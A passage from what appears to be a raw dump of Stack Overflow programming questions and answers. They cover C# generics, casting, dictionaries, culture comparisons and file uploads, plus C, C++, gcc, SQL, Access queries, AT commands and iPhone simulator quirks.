    private void visitNode(AvlTreeNode&lt;T&gt; node)
    {
        if (node == null)
            return;
        else
        {
            traverseQueue.Enqueue(node);
            visitNode(node.LeftChild);
            visitNode(node.RightChild);
        }
    }

    public T Current
    {
        get { return current.Value; }
    }

    object IEnumerator.Current
    {
        get { return Current; }
    }

    public void Dispose()
    {
        current = null;
        tree = null;
    }

    public void Reset()
    {
        current = null;
    }

    public bool MoveNext()
    {
        if (traverseQueue.Count &gt; 0)
            current = traverseQueue.Dequeue();
        else
            current = null;

        return (current != null);
    }
}
</code></pre>

<p>The error given by VS2008:
Error   1   The type 'T' cannot be used as type parameter 'T' in the generic type or method 'Opdr2_AvlTreeTest_Final.AvlTreeNode'. There is no boxing conversion or type parameter conversion from 'T' to 'System.IComparable'.</p>

<p>This error is given on the following lines:</p>

<pre><code>    //members
    private AvlTreeNode&lt;T&gt; current = default(T);  //current highlighted
    private AvlTreeNode&lt;T&gt; tree = null;   //tree highlighted
    private Queue&lt;AvlTreeNode&lt;T&gt;&gt; traverseQueue = null;   //traverseQueue highlighted  

    //Constructor
    public AvlTreePreOrderEnumerator(AvlTreeNode&lt;T&gt; tree)  // AvlTreePreOrderEnumerator highlighted  
    //Method
    private void visitNode(AvlTreeNode&lt;T&gt; node)   //visitNode highlighted  
</code></pre>

<p>For now I've not included the tree and node logic. I anybody thinks it is necessary to resolve this problem, just say so!</p>

<p>Thx!</p>
","33708","","<p>While you haven't posted the actual code causing the error (<code>Opdr2_AvlTreeTest_Final.AvlTreeNode</code>) yet, I strongly suspect the problem is that you are using this class in a generic method/type with a type parameter that's not constrained to implement <code>IComparable&lt;T&gt;</code>.</p>

<p>You can reproduce a similar error with a simple example:</p>

<pre><code>// no problem here at definition site:
void IsLarger&lt;T&gt;(T a, T b) where T : IComparable&lt;T&gt; {
   return a.CompareTo(b) &gt; 0;
}

void Test&lt;T&gt;(T arg) { // note: T is not necessarily IComparable&lt;T&gt;
   Console.WriteLine(IsLarger(arg, arg)); // The compiler shouldn't allow this.
}
</code></pre>
"
"<p>For example.  Lets say we have a stackpanel on a form.  Its full of both Grids and Labels.  I want to loop through all the Grids and do some operation on them but leave the Lables intact.  At the moment I am doing it this way.</p>

<pre><code>foreach(UIElement element in m_stacker.Children)
{
    Grid block = element as Grid;
    if(block != null)
    {
      //apply changes here
    }
}
</code></pre>

<p>So i'm using the fact that ""as"" returns null if it cannot cast into the required type.  Is this an ok thing to do or is there a better solution to this problem?</p>
","33708","","<p>Yes, it's the right way to do it (considering ""applying changes"" will need to use the cast result).</p>

<p>However, if you are not going to use the cast return value, you can simply use <code>is</code>.</p>

<p>Using <code>is</code> and then <a href=""http://stackoverflow.com/questions/2139798/why-is-the-c-as-operator-so-popular/2139818#2139818"">casting again with the cast operator (parenthesis) is frowned upon</a>.</p>
"
"<p>In my application i write the code like this</p>

<pre><code>byte[] byt = new byte[Convert.ToSbyte(textbox1.Text)];
</code></pre>

<p>it is giving the error that input string was not in a correct  format.</p>
","33708","","<p>The text in <code>textbox1</code> is not a valid numeral for a signed byte.</p>

<p>Does it have spaces? Letters? ...?</p>
"
"<p>I have dictionary entries that are read to a <code>Dictionary &lt;string,string&gt; myDict=null;</code></p>

<p>The entries are like:</p>

<pre><code>""user"",""Anthony""
""lastLogin"",""May 10 2010 20:43""
</code></pre>

<p>How would I retrieve <code>lastLogin</code>  with lowercase key  <code>myDict[""lastlogin""]</code> ?</p>
","33708","","<p>A constructor for <code>Dictionary&lt;TKey,TValue&gt;</code> takes a comparer object. You simply need to pass whatever comparer you want to it.</p>

<pre><code>var dic = new Dictionary&lt;string, string&gt;(StringComparer.OrdinalIgnoreCase);
</code></pre>

<p>Of course, you may want to pass things like <code>CurrentCultureIgnoreCase</code> or <code>InvariantCultureIgnoreCase</code> depending on your need.</p>
"
"<p>Please excuse my C newbiness.</p>

<p>Consider the following C procedure:</p>

<pre><code>int doSomething() {
    char *numbers=""123456"";
    ...
}
</code></pre>

<p>Before this procedure exits should I be releasing the 'numbers' pointer?</p>
","33708","","<p>No, you didn't <code>malloc</code> it. Why should you release it?</p>

<p>Often, the string is placed in a read only section of the executable. </p>
"
"<p>below code can't catch the exception.</p>

<p>does  <code>catch</code>  can't catch the exception which occured in the function?</p>

<pre><code> try
 {
   Arche.Members.Feedback.FeedbackBiz_Tx a = 
     new Arche.Members.Feedback.FeedbackBiz_Tx();

   a.AddFreeSubscriptionMember(
     itemNo, buyerID, itemName, 
     DateTime.Today,DateTime.Today);
 }
 catch(Exception ex)
 {
   RegisterAlertScript(ex.Message);
 }
</code></pre>

<p>...</p>

<pre><code>public void AddFreeSubscriptionMember(
  string itemNo, string buyerID, string itemName,
  DateTime fsStartDate, DateTime fsEndDate)
{
  FeedbackBiz_NTx bizNTx = new FeedbackBiz_NTx();

  if (bizNTx.ExistFreeSubscription(buyerID, itemNo))
  {
    throw new Exception(""Exception."");
  }
}
</code></pre>
","33708","","<p>If the <code>ExistFreeSubscription</code> function causes a stack overflow, it won't be caught.</p>

<p>Also, it's possible for the function to throw an exception object that doesn't inherit from <code>System.Exception</code> (this is possible in other languages, it's not CLS compliant). <code>catch (Exception ex)</code> won't catch such kind of exceptions (a <code>catch { }</code> block can catch exception objects even if they are not inherited from <code>System.Exception</code>).</p>
"
"<p>I have a method to which I pass an <code>IEnumerable&lt;TModel&gt;</code>. Then depending on the type of <code>TModel</code>, the method carries out a set of instructions as below:</p>

<pre><code>    public void MyMethod&lt;TModel&gt;(IEnumerable&lt;TModel&gt; items) where TModel : class
    {
        int operationType;
        switch (typeof(TModel))
        {
            case typeof(MyModelOne):
                operationType = 1;
                break;
            case typeof(MyModelTwo):
                operationType = 2;
                break;
            case typeof(MyModelThree):
                operationType = 3;
                break;
            default:
                throw new Exception(""The collection model passed to MyMethod is not recognized"");
        }
        ...
    }
</code></pre>

<p>This doesnt work, I get the error:</p>

<p><strong>There is no application variable or memeber 'TModel'</strong></p>
","33708","","<p>You can't switch on a <code>Type</code> variable. Replace it with cascading <code>if</code> statements.</p>

<pre><code> if (typeof(TModel) == typeof(MyModelOne)) {
    operationType = 1;
 } else if (typeof(TModel) == typeof(MyModelTwo)) {
    operationType = 2;
 } // ...
</code></pre>
"
"<p>as I strive to come up with the best methods name in my designs I struggle on a simple question but still very confusing to me.</p>

<p>There are two ways I use for retrieving stylesheets or javascript files:</p>

<pre><code>&lt;link href=""/myProject/public/styles/master.min.css?v=1274382274"" media=""screen""    rel=""stylesheet"" type=""text/css"" /&gt;
&lt;link href=""http://mydomain.com/public/styles/master.min.css?v=1274382274"" media=""screen""    rel=""stylesheet"" type=""text/css"" /&gt;

&lt;script type=""text/javascript"" src=""/myProject/public/scripts/master.min.js?v=1274394222""&gt;&lt;/script&gt;
&lt;script type=""text/javascript"" src=""http://mydomain.com/public/scripts/master.min.js?v=1274394222""&gt;&lt;/script&gt;
</code></pre>

<p>I know that http://[...] can be called as an URI (as specified by the <a href=""http://stackoverflow.com/questions/1984213/difference-between-uri-and-url"">difference between URI and URL</a>)</p>

<p>but an href or src that specifies a path according to the document root of the server such as <strong>/myProject/public</strong> is different.</p>

<p>So what would be the best term when speaking of those two different href|src value's?</p>

<pre><code>/myProject/public/[...]
http://mydomain.com/[...]
</code></pre>

<ul>
<li>An URI since it specifies a location and an identification?</li>
<li>An URL? Not sure why</li>
<li>A path? A definitive no IMO</li>
<li>Another term, please specify and explain</li>
</ul>

<p>My design is independant of both the href and src, otherwise I would just have used the two terms href and src, of course. So in summary, I need the term that specifies the above while speaking about both about the href and src.</p>

<p>Thanks!</p>
","33708","","<p>I believe the linked question perfectly answers your question. Nothing more to say. All URLs are <a href=""http://en.wikipedia.org/wiki/Uniform_Resource_Identifier"" rel=""nofollow"">URIs</a> but not vice versa. Both of the examples you wrote all <a href=""http://en.wikipedia.org/wiki/Uniform_Resource_Locator"" rel=""nofollow"">URLs</a> (and consequently URIs too). The first is a relative URL and the second is an absolute URL. Both are URLs as they locate a resource. <a href=""http://en.wikipedia.org/wiki/Uniform_Resource_Name"" rel=""nofollow"">URNs</a> are, for instance, URIs but not URLs. They identify a resource but provide no means to locate it. </p>
"
"<p>I'm writing a .dll in Visual Basic. When writing code in Visual Studio if I do something like</p>

<pre><code>Console.WriteLine(
</code></pre>

<p>it will pop up a tooltip with a bit of documentation for the function. Is it possible to write something in my function/sub that would provide that information to Visual Studio?</p>

<p>Thanks</p>
","33708","","<p>Yeah, sure! Something like:</p>

<pre><code>''' &lt;summary&gt;
''' Comment for method
''' &lt;/summary&gt;
''' &lt;param name=""Parameter""&gt;Comment for the parameter ""Parameter""&lt;/param&gt;
''' &lt;remarks&gt;&lt;/remarks&gt;
Sub Test(ByVal Parameter As Integer)

End Sub
</code></pre>

<p>The XML documentatin block should be prepended with three comment (single quote) characters.</p>

<p>You can view a list of <a href=""http://msdn.microsoft.com/en-us/library/ms172653%28VS.80%29.aspx"" rel=""nofollow"">common documentation XML tags here</a>.</p>

<p>Bonus point is that the compiler can extract an XML file and put it alongside your assembly which documentation generator tools (like Sandcastle, NDoc) can use to generate formatted help files with your API documentation automatically.</p>
"
"<p>Does anyone know what C# compiler does under the hood with the following code?</p>

<pre><code>dict = new Dictionary&lt;int, string&gt;()
{
    { 1, ""value1"" },
    { 2, ""value2"" }
}
</code></pre>

<p>It is not clear to if it creates the KeyValuePair instances and call the Add method, or do something more optimized. Does anyone of you know it?</p>
","33708","","<p>It'll call the <code>Add</code> method on the object with the values as arguments:</p>

<pre><code>var __temp = new Dictionary&lt;int, string&gt;();
__temp.Add(1, ""value1"");
__temp.Add(2, ""value2"");
dict = __temp;
</code></pre>

<p>The name <code>Add</code> is hardcoded (specified in the C# spec: <strong><em>7.5.10.3</strong>: Collection initializers</em>). The number of arguments to the method is not limited. It just has to match the number of parameters of the method. Any collection (implementing <code>IEnumerable</code> interface) that provides an <code>Add</code> method can be used like that.</p>

<p>To further clarify, no, the compiler doesn't really care that the class is a <code>Dictionary</code> to create a <code>KeyValuePair</code> and pass that to <code>Add</code>. It simply generates a sequence of calls to the <code>Add</code> method passing all the arguments in each collection item in each call. The <code>Add</code> method is responsible for the rest. </p>
"
"<pre><code>IEnumerable&lt;Department&gt; myQuery = (from D in myContext.Departments orderby D.DeptName select D);

var myQuery = (from D in myContext.Departments orderby D.DeptName select D);
</code></pre>

<p>What is the difference between these two statements above? In my little asp.net/C#/ EF4.0 app I can write them either way, and as far as how I want to use them, they both work, but there has to be a reason why I would choose one over the other?</p>
","33708","","<p>The second one is shorter (assuming type of <code>D</code> is <code>Department</code>).</p>

<p>(actually, the return type of the query may be something other than <code>IEnumerable</code>, like <code>IQueryable</code> but the point is, the type will be statically <em>inferred</em> from the right hand side of the assignment operator instead of being explicitly mentioned in code).</p>
"
"<p>One thing that has bothered me about C# since its release was the lack of a generic IsNumeric function.  I know it is difficult to generate a one-stop solution to detrmine if a value is numeric.</p>

<p>I have used the following solution in the past, but it is not the best practice because I am generating an exception to determine if the value is IsNumeric:</p>

<pre><code>public bool IsNumeric(string input)
{
    try
    {
        int.Parse(input);
        return true;
    }
    catch
    {
        return false;
    }
}
</code></pre>

<p>Is this still the best way to approach this problem or is there a more efficient way to determine if a value is numeric in C#?</p>
","33708","","<p>Try this:</p>

<pre><code>int temp;
return int.TryParse(input, out temp);
</code></pre>

<p>Of course, the behavior will be different from <a href=""http://msdn.microsoft.com/en-us/library/6cd3f6w1%28VS.71%29.aspx"">Visual Basic <code>IsNumeric</code></a>. If you want that behavior, you can add a reference to ""Microsoft.VisualBasic"" assembly and call the <a href=""http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.information.isnumeric.aspx""><code>Microsoft.VisualBasic.Information.IsNumeric</code> function</a> directly.</p>
"
"<p>colleagues.
I've got task to fast find object by its string property.
Object:</p>

<pre><code>  class DicDomain
  {
    public virtual string Id{ get; set; }
    public virtual string Name { get; set; }
  }
</code></pre>

<p>For storing my object I use List[T] dictionary where T is DicDomain for now .
I've got 5-10 such lists, which contain about 500-20000 at each one.
Task is find objects by its Name.
I use next code now:</p>

<pre><code>  List&lt;T&gt; entities = dictionary.FindAll(s =&gt; s.Name.Equals(word, StringComparison.OrdinalIgnoreCase));
</code></pre>

<p>I've got some questions:</p>

<p>Is my search speed optimal. I think now.</p>

<ol>
<li>Data structure. It List good for this task. What about hashtable,sorted...</li>
<li>Method Find. May be i should use string intern??</li>
</ol>

<p>I haven't much exp at these tasks. Can u give me good advice for increase perfomance.
Thanks</p>
","33708","","<p>If you are performing this operation frequently, you can build a <code>Dictionary&lt;string, List&lt;DicDomain&gt;&gt;</code> (or <code>Dictionary&lt;string, DicDomain&gt;</code> if <code>Name</code> is unique) to build a reverse mapping (from a name to a bunch of <code>DicDomain</code> objects) and keep that dictionary up to date.</p>

<p>The task will be a simple hash table lookup after that:</p>

<pre><code> var list = dictionary[name];
</code></pre>
"
"<p>I am revising for the MCTS example and am on a small section regarding Culture-Insensitive comparisons.  I get the principle, you don't two items which are the same (i.e dates) but are displayed differently and hence are pragmatically marked as different.</p>

<p>However call me stupid but I am finding it hard to see where I can use it is practice, for example why would you have two different date times, in the same code, in which they are different cultures? The only way to do so would be if you manually override the one of the datatypes cultures and why would you do that?</p>

<p>Any example of a real-world application of culturally insensitive comparisons? </p>

<p>Cheers</p>
","33708","","<p>You may want to compare a user input (which can be in different cultures) with a reference string set in code.</p>

<p>One of the classic use-cases for culture invariant comparisons is the <a href=""http://en.wikipedia.org/wiki/Dotted_and_dotless_I"" rel=""nofollow"">Turkish-I problem</a>.
Assume that you have a textbox in your application that validates a URL protocol by checking whether it starts with <code>http://</code>, <code>ftp://</code>, or <code>file://</code>. If you write:</p>

<pre><code>inputUrl.StartsWith(""FILE://"", StringComparison.CurrentCultureIgnoreCase)
</code></pre>

<p>and the user input is <code>file://test</code>, it'll work on a machine with English regional settings (more accurately, the thread's <code>CurrentCulture</code>) but the test will fail if the culture is set to Turkish because the uppercase version of <code>file://</code> will be <code>FÄ°LE://</code> in Turkish alphabet.</p>

<p>In these cases, we want to match the string using invariant culture:</p>

<pre><code>inputUrl.StartsWith(""FILE://"", StringComparison.InvariantCultureIgnoreCase)
</code></pre>

<p>In general, when you want to perform comparisons for input data where the input has specific semantics in your program (it represents a URL, resource key, ...) rather than simply being used for display purposes or storage and retrieval, you should consider using <code>InvariantCulture</code>.  </p>
"
"<p>I need to compile some files with a usage of modified versions of standard library headers. With Visual C++ compiler I will do this by usage of <em>/X (Ignore Standard Include Paths)</em> and <em>/I (Additional Include Directories)</em> parameters. How this should be done with gcc?</p>
","33708","","<pre><code>gcc -nostdinc -I/custom/include/path/goes/here
</code></pre>

<p><code>-nostdinc</code> ignores standard C include directories<br>
<code>-nostdinc++</code> ignores standard C++ include directories</p>
"
"<p>Hey guys<br>
i am making one application,<br>
what to use if i want to upload data on server in C# based application.<br>
i know this names in web services [ i don't know How to use it? ]<br>
<br>
1. SOAP,<br>
2. REST,<br>
3. AWS <br></p>

<p>So my question is,
<br>
How many ways i can upload my data file to server?<br>
Do i have to use web service or is their any other way to upload data file?<br>
btw... i am just beginner in C# and web service...so may be u will find this question simple.
<br>
<hr>
thanks in advance,<Br>
nitz.</p>

<p><br></p>

<p><b>EDIT :</b><br>
my app. is on windows based.....<br>
and the files which will be generated from my app. , that i want to store at server.....</p>
","33708","","<p>You don't need to use any fancy ""web service"" technology to upload data from a client application to a server. You can create a simple ASP.NET Web handler and save the input file from the request body:</p>

<pre><code>public class FileUploader : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
       string fileName = context.Request.QueryString[""FileName""];
       byte[] fileData = context.Request.BinaryRead(context.Request.ContentLength);
       string path = ...; // decide where you want to save the file
       File.WriteAllBytes(path, fileData);
    }

    public bool IsReusable
    {
        get { return false; }
    }
}
</code></pre>

<p>From the client app, you'd use <a href=""http://msdn.microsoft.com/en-us/library/36s52zhs.aspx"" rel=""nofollow""><code>WebClient.UploadFile</code> method</a>:</p>

<pre><code>using (var client = new WebClient()) {
    client.QueryString[""FileName""] = fileName;
    client.UploadData(url, inputFileData); 
}
</code></pre>

<p>This approach eliminates the overhead of protocols like SOAP and posts the file directly in the HTTP request body.</p>
"
"<p><br>
I'm developing a <code>TypeTranslator</code> class which has a method <code>Type TranslateType(Type type)</code>.
This method gets a type of an interface and if there's a class of interface name without leading I  it creates it, otherwise an exception is raised.<br>
Here's some code to clearify what's written before:
<pre><code>class Program
{
    interface IAnimal { }
    class Animal : IAnimal { }</p>

<pre><code>void Function()
{
    TypeTranslator typeTranslator = new TypeTranslator();
    Assert(typeTranslator.TranslateType(typeof(IAnimal) == typeof(Animal)));
}
</code></pre>

<p>}
</pre></code></p>

<p>Is it possible to get what I want?<br>
Thank you for your help!</p>
","33708","","<p>Do you want to get a type name from a string variable? If yes, then you can use <a href=""http://msdn.microsoft.com/en-us/library/w3f99sx1.aspx"" rel=""nofollow"">Type.GetType</a> method. Of course, the method expects the type name to be qualified by its namespace. Alternatively, if you don't want to restrict the type to a specific namespace, you can grab all types in an assembly with <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.assembly.gettypes.aspx"" rel=""nofollow"">Assembly.GetTypes</a> method and look for a type with a specific name. </p>
"
"<p>I'm not sure if I am going about this the right way. I am making some c++ classes to use in 2 apps. I am going to have to compile them to be used in a Cocoa app and later be compiled for use with fastcgi.</p>

<p>Should I create a dynamic library?</p>
","33708","","<p>If the source files have to be compiled with different conditional compilation settings to work in the two applications, you'd better ship the source and compile it along with the apps themselves. </p>

<p>Otherwise, you can create a library and ship the compiled versions along with the headers for compilation of the apps. Whether the library should be dynamic or not depends on your situation. If you don't need to update the library separately without recompiling the executable, a simple static library is probably a better choice.</p>
"
"<p>I'm having trouble with CultureInfo in our ASP.NET web application. Our web application returns a different culture, depending on which application pool it is in. </p>

<p>In application pool A, it is en-US, but in application pool B, it's nl-BE.</p>

<p>I'd like it to be nl-BE, but can't find where to change this (IIS6 by the way). I'm not even sure if this can be changed on an app-pool level.</p>

<p>I'm checking with CultureInfo.CurrentCulture.Name.</p>

<p>Is it possible to change this for an application pool? Or what else could influence this? In the regional settings of the server, we have selected 'Dutch (Belgium)', which translates to nl-BE, I believe. So where could this application pool be getting the en-US?</p>
","33708","","<p>Yes, it can be different. It's a per-thread property. You can set <code>CurrentCulture</code> for each thread separately.</p>

<p>Are you sure you are not altering the setting somewhere in code? Is <a href=""http://msdn.microsoft.com/en-us/library/hy4kkhe0%28VS.71%29.aspx"" rel=""nofollow""><code>&lt;globalization&gt;</code> setting</a> identical for both tests? </p>

<p>If you want to force a specific culture, try something like:</p>

<pre><code>&lt;globalization culture=""en-US"" uiCulture=""en-US"" /&gt;
</code></pre>
"
"<pre><code>public class Parser
{
    Downloader download = new Downloader();
    HtmlDocument Page;

    public Parser(string MovieTitle)
    {
        Page = download.FindMovie(MovieTitle);
    }

    public Parser(string ActorName)
    {
        Page = download.FindActor(ActorName);
    }
}
</code></pre>

<p>I want to create a constructor that will allow other developers who use this library to easily create a Parser object with the relevant HtmlDocument already loaded as soon as it's done creating it.</p>

<p>The problem lies in that a constructor cannot exist twice with the same type of parameters. Sure <strong>I</strong> can tell the logical difference between the two paramters, but the computer can't.</p>

<p>Any suggestions on how to handle this?</p>

<p>Thank you!</p>
","33708","","<p>Use a couple <code>static</code> methods instead:</p>

<pre><code>public class Parser
{
    Downloader download = new Downloader();
    HtmlDocument Page;

    private Parser() { } // prevent instantiation from the outside

    public static Parser FromMovieTitle(string MovieTitle)
    {
        var newParser = new Parser();
        newParser.Page = newParser.download.FindMovie(MovieTitle);
        return newParser;
    }

    public static Parser FromActorName(string ActorName)
    {
        var newParser = new Parser();
        newParser.Page = newParser.download.FindActor(ActorName);
        return newParser;
    }
}
</code></pre>
"
"<p>In my database running on SQL Server 2008 R2 I have a special table for global variables:</p>

<pre><code>CREATE TABLE global_variables
(
    name NVARCHAR(50),
    value NVARCHAR(50) NOT NULL
CONSTRAINT PK_global_variables PRIMARY KEY CLUSTERED
(
    name ASC
) WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
</code></pre>

<p>Does such table require indexing on <code>value</code> or not?</p>
","33708","","<p>The primary key constraint creates an index (in this example, a clustered index) on the <code>name</code> column.</p>

<p>If you have queries that try to look up the <code>name</code> by giving the <code>value</code>, you'll need an index on <code>value</code> column to do that efficiently. Otherwise, if all of your lookups are based on <code>name</code>, you don't need to create an index on the <code>value</code> column.</p>
"
"<p>I'm trying to create a query in an access database for a C# dataset using the query editor but the created method says there is a problem and isn't created correctly.</p>

<pre><code>SELECT Discs.*
FROM Discs
WHERE (Title=@Title OR @Title IS NULL) AND
(Type=@Type OR @Type IS NULL) AND
(ContainerID=@ContainerID OR @ContainerID IS NULL) AND
NOT (@Title IS NULL AND @Type IS NULL AND @ContainerID IS NULL)
</code></pre>

<p>the error is:</p>

<pre><code>Generated SELECT statement.
Error in WHERE clause near '@'.
Unable to parse query text.
</code></pre>

<p>the generated select method doesn't have any parameters and is unusable.
I've tried the exact same SQL statement in the access query and it worked flawlessly, what am I supposed to be doing differently when transferring it to C#?</p>
","33708","","<p>As far as I can remember (last time I tried, .NET 1.1 was the latest thing, so I'm not sure it's the case), when you are talking to Jet OLEDB provider, you should signify parameters in the query with question marks (parameters are not named and the order matters):</p>

<pre><code>SELECT [Discs].*
FROM [Discs]
WHERE ([Title]=? OR ? IS NULL) AND
([Type]=? OR ? IS NULL) AND
([ContainerID]=? OR ? IS NULL) AND
NOT (? IS NULL AND ? IS NULL AND ? IS NULL)
</code></pre>

<p>(I'd wrap the identifiers in brackets so that they don't cause problems should one of them be a keyword, you may try this before changing parameters to question marks) </p>

<p>Considering that your query uses the same parameters repeatedly, you probably have to add it more than once to the <code>Parameters</code> collection of your <code>OleDbCommand</code> instance.</p>
"
"<p>Do you know of a JavaScript widget for Solar Hijri (Jalali) dates?  Users will likely enter dates as Solar Hijri and I need to convert.</p>
","33708","","<p>You can find an LGPL licensed Javascript implementation for converting dates back and forth here:</p>

<p><a href=""http://www.farsiweb.info/jalali/jalali.js"" rel=""nofollow"">http://www.farsiweb.info/jalali/jalali.js</a></p>
"
"<p>does anyone know where i can get the official list of all AT COMMANDS available? i would like to get my computer speaking to my cell phone. i need all AT COMMANDS and i will hook it up to either .NET or VBA or anything else.</p>

<p>btw i have a motorola phone</p>
","33708","","<p>While the exact set of AT commands differ from device to device and you should get it from the device manufacturer, the standard variation of <a href=""http://en.wikipedia.org/wiki/Hayes_command_set"" rel=""nofollow"">Hayes AT command set</a> standardized by 3GPP for GSM user equipment can be found here:</p>

<p><a href=""http://www.3gpp.org/ftp/Specs/archive/27_series/27.007/27007-3d0.zip"" rel=""nofollow"">Technical Specification Group Terminals;<br>
AT command set for User Equipment (UE)</a></p>
"
"<p>I'm trying to determine if a user is a member of a group or not in AD.  However, the following doesn't seem to be working for some reason...</p>

<pre><code>public bool MemberOf(string sObjectName, string sGroup, bool bIsGroup)
{
    DirectoryEntry dEntry = CreateDirectoryEntry();
    DirectorySearcher dSearcher = new DirectorySearcher(dEntry);
    if (bIsGroup) dSearcher.Filter = ""(distinguishedName="" + sObjectName + "")"";
    else dSearcher.Filter = ""(&amp;(sAMAccountName="" + sObjectName + "")(objectClass=user))"";  
    SearchResult sResult = dSearcher.FindOne();
    if (sResult != null)
    {
        foreach (object oGroup in sResult.Properties[""MemberOf""])
        {
            if (oGroup.ToString() == sGroup) return true;
            else this.MemberOf(oGroup.ToString(), sGroup, true);
        }
    }
    return false;
}
</code></pre>

<p>Another variation: <a href=""http://users.business.uconn.edu/dwick/work/wtf/6-14-2010%201-15-15%20PM.png"" rel=""nofollow"">http://users.business.uconn.edu/dwick/work/wtf/6-14-2010%201-15-15%20PM.png</a></p>

<p>Doesn't work either.  This seems like a really dumb question... but shouldn't it break the loop upon ""return true;""</p>
","33708","","<p>Are you sure that line is executing? Maybe the <code>if</code> condition never evaluates to <code>true</code>. Place a breakpoint and check. ... and yes, it should break the loop.</p>
"
"<p>In the following C++ code, 32767 + 1 = -32768.</p>

<pre><code>#include &lt;iostream&gt;
int main(){
short var = 32767;
var++;
std::cout &lt;&lt; var;
std::cin.get();
}
</code></pre>

<p>Is there any way to just leave ""var"" as 32767, without errors?</p>
","33708","","<p>Yes, there is:</p>

<pre><code>if (var &lt; 32767) var++;
</code></pre>

<p>By the way, you shouldn't hardcode the constant, use <code>numeric_limits&lt;short&gt;::max()</code> defined in <code>&lt;limits&gt;</code> header file instead.</p>

<p>You can encapsulate this functionality in a function template:</p>

<pre><code>template &lt;class T&gt;
void increment_without_wraparound(T&amp; value) {
   if (value &lt; numeric_limits&lt;T&gt;::max())
     value++;
}
</code></pre>

<p>and use it like:</p>

<pre><code>short var = 32767;
increment_without_wraparound(var); // pick a shorter name!
</code></pre>
"
"<p>I have the following classes with an implicit cast operator defined:</p>

<pre><code>class A
{
    ...
}
class B
{
    private A m_a;

    public B(A a)
    {
        this.m_a = a;
    }

    public static implicit operator B(A a)
    {
        return new B(a);
    }
}
</code></pre>

<p>Now, I can implicitly cast A to B.</p>

<p>But why can't I implicitly cast A[] to B[] ?</p>

<pre><code>static void Main(string[] args)
{
    // compiles
    A a = new A();
    B b = a;

    // doesn't compile
    A[] arrA = new A[] {new A(), new A()};
    B[] arrB = arrA;
}
</code></pre>

<p>Thanks, Malki.</p>
","33708","","<p>Array covariance only works for reference types and in the inheritance hierarchy (note that it's not a representation-changing conversion: just a set of pointers with identical size interpreted differently.) It will not work for value types and user defined conversions.</p>
"
"<p>I'm basically wanting to do this:</p>

<pre><code>class UILockable&lt;T&gt; : T
    where T : UIWidget
{
}
</code></pre>

<p>However, this doesn't work. I've seen people recommend that you do this:</p>

<pre><code>class UILockable&lt;T&gt;
    where T : UIWidget
{
    private T _base;
}
</code></pre>

<p>This would require me to override each function UILockable would need and forward it to T. This is impossible since T may derive from UIWidget and have unique abstract/virtual methods of its own.</p>

<p>Is there no way to simply inherit from T?</p>
","33708","","<p>You can't inherit from the generic type parameter.  C# generics are very different from C++ templates.  Inheriting from the type parameter requires the class to have a completely different representation based on the type parameter, which is not what happens with .NET generics. They are identical at the IL and native level (for all reference type arguments).</p>
"
"<p>can anyone tell me if the C# Random.Next() method is thread safe? </p>
","33708","","<p>There's nothing special done in the <code>Next</code> method to achieve thread safety. However, it's an instance method. If you don't share instances of <code>Random</code> across different threads, you don't have much to worry about.</p>

<p>Jon has nice posts on this subject:</p>

<p><a href=""http://www.yoda.arachsys.com/csharp/miscutil/usage/staticrandom.html"" rel=""nofollow""><code>StaticRandom</code></a><br>
<a href=""http://codeblog.jonskeet.uk/2009/11/04/revisiting-randomness/"" rel=""nofollow"">Revisiting randomness</a></p>
"
"<p>Since I started iPhone/iPod Development I have come across some differences between how the simulator and how real device react. Maybe I will come across some other differences I will have to figure out as well, maybe other people haven't met these problems here (YET) and can profit from the knowledge, and maybe you know some problems/differences that you would have been happy to know about earlier before you spent several hours or days figuring out what the heck is going on.</p>

<p>So here is what I came across.</p>

<ol>
<li><p>Simulator is not case sensitive, Devices are case sensitive.</p>

<ul>
<li>This means a default.png or Icon.png will work in simulator, but not on a device where they must be named Default.png and icon.png (if it's still not working read <a href=""http://stackoverflow.com/questions/2233860/iphone-splash-default-png-displays-on-simulator-but-not-the-iphone/2982007#2982007"">this answer</a>)</li>
</ul></li>
<li><p>Simulator has different codecs to play audio and video</p>

<ul>
<li>If you use f.e. MPMoviePlayerController you might play certain video on the simulator while on the device it won't work
(use Handbrake->presets->iPhone &amp; iPod Touch to create playable videos for Simulator and Device).</li>
<li>If you play audio with AudioServicesPlaySystemSound(&amp;soundID) you might here the sound on simulator but not an a device. (use Audacity to open your soundfile, export as wav and run afconvert -f caff -d LEI16@44100 -c 1 audacity.wav output.caf in terminal)</li>
</ul></li>
<li><p>Also there is this flickering on second run problem which can be resolved with an<br>
playerViewCtrl.initialPlaybackTime = -1.0;<br>
either on the end of playing or before each beginning.</p></li>
<li><p>Simulator is mostly much faster cause it doesn't simulate the hardware but uses Mac resources, therefore f.e. sio2 Apps (OpenGL,OpenAL,etc. framework) run much better on simulator, well everything that uses more resources will run visibly better in simulator than on device.</p></li>
</ol>

<p>I hope we can add some more to this.</p>
","33708","","<p>Just to clarify your first point:</p>

<blockquote>
  <p>Simulator is not case sensitive, Devices are case sensitive</p>
</blockquote>

<p>Being case-sensitive or not in that sense is not a characteristic of simulator. It's a characteristic of the underlying filesystem. The filesystem on device is case sensitive HFS+ while the file system on the Mac is likely to be case insensitive (by default). If the application runs on a case sensitive HFS+ partition, it'll become case sensitive when it comes to loading files from disk even when it runs in the simulator.</p>
"
"<p>for a long time, I am thinking and studying output of C language compiler in assembler form, as well as CPU architecture. I know this may be silly to you, but it seems to me that something is very ineffective. Please, donÂ´t be angry if I am wrong, and there is some reason I do not see for all these principles. I will be very glad if you tell me why is it designed this way. I actually truly believe I am wrong, I know the genius minds of people which get PCs together knew a reason to do so. What exactly, do you ask? IÂ´ll tell you right away, I use C as a example:</p>

<p>1: Stack local scope memory allocation:</p>

<p>So, typical local memory allocation uses stack. Just copy esp to ebp and than allocate all the memory via ebp. OK, I would understand this if you explicitly need allocate RAM by default stack values, but if I do understand it correctly, modern OS use paging as a translation layer between application and physical RAM, when address you desire is further translated before reaching actual RAM byte. So why donÂ´t just say 0x00000000 is int a,0x00000004 is int b and so? And access them just by mov 0x00000000,#10? Because you wont actually access memory blocks 0x00000000 and 0x00000004 but those your OS set the paging tables to. Actually, since memory allocation by ebp and esp use indirect addressing, ""my"" way would be even faster.</p>

